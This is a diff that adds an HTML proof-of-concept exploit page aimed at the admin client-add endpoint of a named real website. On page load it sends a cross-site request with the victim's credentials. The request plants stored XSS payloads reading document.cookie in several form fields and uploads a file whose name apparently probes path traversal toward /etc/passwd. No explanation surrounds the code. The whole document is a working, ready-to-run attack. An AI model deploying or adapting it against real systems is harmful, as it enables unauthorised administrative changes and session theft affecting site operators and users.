@@ -1,0 +1,48 @@
+<html>
+  <body>
+    <script>
+      function submitRequest()
+      {
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", "https:\/\/www.selfassurance.fr\/admin\/client\/add", true);
+        xhr.setRequestHeader("Accept", "text\/html,application\/xhtml+xml,application\/xml;q=0.9,*\/*;q=0.8");
+        xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
+        xhr.setRequestHeader("Content-Type", "multipart\/form-data; boundary=----geckoformboundarydf93b82cdd90d0f9609d532da566976");
+        xhr.withCredentials = true;
+        var body = "------geckoformboundarydf93b82cdd90d0f9609d532da566976\r\n" + 
+          "Content-Disposition: form-data; name=\"name\"\r\n" + 
+          "\r\n" + 
+          "brking\"\x3e\x3csvg onload=alert(document.cookie)\x3e\r\n" + 
+          "------geckoformboundarydf93b82cdd90d0f9609d532da566976\r\n" + 
+          "Content-Disposition: form-data; name=\"url\"\r\n" + 
+          "\r\n" + 
+          "test\"\x3e\x3csvg onload=alert(document.cookie)\x3e\r\n" + 
+          "------geckoformboundarydf93b82cdd90d0f9609d532da566976\r\n" + 
+          "Content-Disposition: form-data; name=\"type\"\r\n" + 
+          "\r\n" + 
+          "test\"\x3e\x3csvg onload=alert(document.cookie)\x3e\r\n" + 
+          "------geckoformboundarydf93b82cdd90d0f9609d532da566976\r\n" + 
+          "Content-Disposition: form-data; name=\"photo\"; filename=\"_.._etc_passwd_logo_brking.png\"\r\n" + 
+          "Content-Type: image/png\r\n" + 
+          "\r\n" + 
+          "\x89PNG\r\n" + 
+          "\x1a\r\n" + 
+          "\x00\x00\x00\rIHDR\x00\x00\x04\xb0\x00\x00\x04\xb0\x08\x06\x00\x00\x00\xeb!\xb3\xcf\x00\x00\x00\x19tEXtSoftware\x00Adobe ImageReadyq\xc9e\x3c\x00\x00\x03|iTXtXML:com.adobe.xmp\x00\x00\x00\x00\x00\x3c?xpacket begin=\"\xef\xbb\xbf\" id=\"W5M0MpCehiHzreSzNTczkc9d\"?\x3e \x3cx:xmpmeta xmlns:x=\"adobe:ns:meta/\" x:xmptk=\"Adobe XMP Core 5.3-c011 66.145661, 2012/02/06-14:56:27\r\n" + 
+          "\r\n" + 
+          "------geckoformboundarydf93b82cdd90d0f9609d532da566976\r\n" + 
+          "Content-Disposition: form-data; name=\"form1\"\r\n" + 
+          "\r\n" + 
+          "\r\n" + 
+          "------geckoformboundarydf93b82cdd90d0f9609d532da566976--\r\n";
+        var aBody = new Uint8Array(body.length);
+        for (var i = 0; i < aBody.length; i++)
+          aBody[i] = body.charCodeAt(i); 
+        xhr.send(new Blob([aBody]));
+      }
+      submitRequest();
+    </script>
+    <form action="#">
+      <input type="button" value="Submit request" onclick="submitRequest();" />
+    </form>
+  </body>
+</html>
